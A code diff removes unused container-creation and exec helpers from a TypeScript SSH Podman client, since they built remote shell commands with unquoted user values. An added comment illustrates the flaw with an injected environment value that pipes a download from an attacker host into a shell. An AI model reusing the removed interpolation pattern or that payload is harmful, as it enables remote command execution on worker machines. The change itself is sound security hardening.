@@ -1456,119 +1456,16 @@ export class SSHPodmanClient {
     return containers[0];
   }
 
-  private resolveImageName(image: string): string {
-    // If the image already has a registry or slash, use as-is
-    if (image.includes('/') || image.startsWith('docker.io/') || image.startsWith('quay.io/') || image.startsWith('ghcr.io/')) {
-      return image;
-    }
-    // Common short names - add docker.io/library/ prefix
-    return `docker.io/library/${image}`;
-  }
-
-  async createContainer(config: {
-    name?: string;
-    image: string;
-    env?: Record<string, string> | string[];
-    ports?: Record<string, Array<{ hostPort: string }>>;
-    labels?: Record<string, string>;
-    restartPolicy?: string;
-    command?: string[];
-    entrypoint?: string[];
-    workingDir?: string;
-    binds?: string[];
-    memory?: number;
-    cpuPeriod?: number;
-    cpuQuota?: number;
-  }): Promise<{ Id: string; Warnings: string[] }> {
-    // Resolve image name to full path
-    const resolvedImage = this.resolveImageName(config.image);
-    
-    // First try to pull the image
-    const pullResult = await this.exec(`podman pull ${resolvedImage}`);
-    if (pullResult.exitCode !== 0) {
-      console.warn(`Failed to pull image ${resolvedImage}: ${pullResult.stderr}`);
-    }
-
-    let cmd = `podman run -d`;
-    
-    if (config.name) {
-      cmd += ` --name ${config.name}`;
-    }
-    
-    if (config.labels) {
-      for (const [key, value] of Object.entries(config.labels)) {
-        // Escape single quotes and wrap in single quotes for shell safety
-        const escapedValue = value.replace(/'/g, "'\\''");
-        cmd += ` --label '${key}=${escapedValue}'`;
-      }
-    }
-    
-    if (config.env) {
-      const envArray = Array.isArray(config.env) 
-        ? config.env 
-        : Object.entries(config.env).map(([k, v]) => `${k}=${v}`);
-      for (const env of envArray) {
-        cmd += ` -e ${env}`;
-      }
-    }
-    
-    if (config.restartPolicy && config.restartPolicy !== 'no') {
-      const policyMap: Record<string, string> = {
-        'always': 'always',
-        'on-failure': 'on-failure',
-        'unless-stopped': 'unless-stopped',
-      };
-      cmd += ` --restart ${policyMap[config.restartPolicy] || 'no'}`;
-    }
-    
-    if (config.ports) {
-      for (const [containerPort, bindings] of Object.entries(config.ports)) {
-        // Strip /tcp or /udp suffix from container port
-        const port = containerPort.replace(/\/(tcp|udp)$/i, '');
-        for (const binding of bindings) {
-          // Loopback only — see the REST client's PortBindings for why.
-          cmd += ` -p 127.0.0.1:${binding.hostPort}:${port}`;
-        }
-      }
-    }
-    
-    if (config.binds) {
-      for (const bind of config.binds) {
-        cmd += ` -v ${bind}`;
-      }
-    }
-    
-    if (config.memory) {
-      cmd += ` --memory=${config.memory}`;
-    }
-    
-    if (config.cpuPeriod) {
-      cmd += ` --cpu-period=${config.cpuPeriod}`;
-    }
-    
-    if (config.cpuQuota) {
-      cmd += ` --cpu-quota=${config.cpuQuota}`;
-    }
-    
-    if (config.workingDir) {
-      cmd += ` -w ${config.workingDir}`;
-    }
-    
-    cmd += ` ${resolvedImage}`;
-    
-    // Command arguments go after the image
-    if (config.command && config.command.length > 0) {
-      cmd += ` ${config.command.map(c => `'${c.replace(/'/g, "'\\''")}'`).join(' ')}`;
-    }
-
-    const result = await this.exec(cmd);
-    if (result.exitCode !== 0) {
-      throw new Error(`podman run failed: ${result.stderr}`);
-    }
-    
-    const containerId = result.stdout.trim();
-    return { Id: containerId, Warnings: [] };
-  }
+  // `createContainer`, `execContainer` and `resolveImageName` used to live
+  // here. They built `podman run` / `podman exec` command *strings* with the
+  // name, working directory, image, `-e KEY=value` and `-v` arguments
+  // interpolated unquoted, and handed them to `executeSSHCommand`, where the
+  // remote shell interprets them — so an environment value of
+  // `x; curl attacker.sh | sh` would have run as the SSH user on the worker.
+  // Nothing called them: the only consumer of this class pings and lists. They
+  // are deleted rather than escaped, because a correct-but-unused copy of a
+  // command builder is a trap for whoever needs one next, and the REST client
+  // above is the path that should be taken. See the module comment and ssh.ts.
 
   async startContainer(id: string): Promise<void> {
     const result = await this.exec(`podman start ${id}`);
@@ -1650,27 +1547,6 @@ export class SSHPodmanClient {
     }
     
     return result.stdout;
-  }
-
-  async execContainer(
-    id: string,
-    cmd: string[] = ['/bin/sh'],
-    options: {
-      attachStdout?: boolean;
-      attachStderr?: boolean;
-      attachStdin?: boolean;
-      tty?: boolean;
-    } = {}
-  ): Promise<{ stdout: string; stderr: string; exitCode: number }> {
-    const escapedArgs = cmd.map(a => `'${a.replace(/'/g, "'\\''")}'`).join(' ');
-    const fullCmd = `podman exec ${id} ${escapedArgs}`;
-    
-    const result = await this.exec(fullCmd);
-    return {
-      stdout: result.stdout,
-      stderr: result.stderr,
-      exitCode: result.exitCode,
-    };
   }
 
   destroy(): void {
